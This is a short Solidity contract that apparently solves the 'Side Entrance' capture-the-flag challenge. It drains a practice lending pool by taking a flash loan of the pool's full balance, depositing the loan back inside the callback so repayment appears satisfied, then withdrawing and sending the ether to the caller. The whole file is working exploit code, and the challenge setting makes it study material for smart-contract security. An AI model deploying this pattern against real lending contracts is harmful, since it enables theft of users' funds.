// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract SideAttack {
    using Address for address payable;
    SideEntranceLenderPool public pool;

    constructor(address payable _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attackMe() public payable {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        // receive flash loan and call pool.deposit depositing the loaned amount
        pool.deposit{value: msg.value}();
    }

    fallback() external payable {}
}
